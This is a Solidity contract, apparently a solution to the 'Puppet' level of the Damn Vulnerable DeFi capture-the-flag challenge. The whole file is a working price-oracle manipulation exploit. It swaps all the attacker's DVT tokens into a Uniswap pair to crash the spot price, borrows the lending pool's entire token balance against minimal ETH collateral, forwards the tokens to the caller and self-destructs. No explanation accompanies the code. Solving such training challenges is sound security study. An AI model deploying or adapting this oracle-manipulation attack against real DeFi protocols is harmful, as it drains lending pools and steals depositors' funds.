// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuppetPool.sol";

contract PuppetAttacker {
    PuppetPool public pool;
    DamnValuableToken public token;
    address public uniswapPair;

    constructor(address poolAddress, address tokenAddress, address uniswapPairAddress) {
        pool = PuppetPool(poolAddress);
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    function attack() public payable {
        token.transferFrom(msg.sender, address(this), token.balanceOf(msg.sender));
        token.approve(uniswapPair, token.balanceOf(address(this)));
        (bool sc,) = uniswapPair.call(
            abi.encodeWithSignature(
                "tokenToEthSwapInput(uint256,uint256,uint256)",
                token.balanceOf(address(this)),
                1,
                block.timestamp + 10 days
            )
        );
        require(sc, "Swap failed");
        uint256 amountToPay = pool.calculateDepositRequired(token.balanceOf(address(pool)));
        pool.borrow{value: amountToPay}(token.balanceOf(address(pool)), msg.sender);
        token.transfer(msg.sender, token.balanceOf(address(this)));
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
